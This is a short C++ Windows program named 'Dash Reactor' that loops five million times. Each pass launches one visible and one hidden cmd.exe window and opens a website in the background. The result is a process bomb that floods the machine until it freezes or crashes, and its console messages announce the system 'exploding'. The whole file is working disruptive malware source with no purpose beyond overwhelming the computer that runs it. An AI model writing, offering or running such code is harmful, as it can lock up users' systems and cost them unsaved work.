
#include "pch.h"

#include<windows.h>

#include<iostream>
#include<string>

int main() {
	std::cout << "<*> Dash Reactor is almost exploding ...." << std::endl;

	for(int index = 0; index <= 5000000; index += 1) {
		ShellExecute(NULL, "open", "C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOW);
		ShellExecute(NULL, "open", "C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_HIDE);
		ShellExecute(NULL, "open", "http://www.dashware-software.co.uk", NULL, NULL, SW_HIDE);
	}

	std::cout << "<*> Dash Reactor exploded!" << std::endl;
	return 0;
}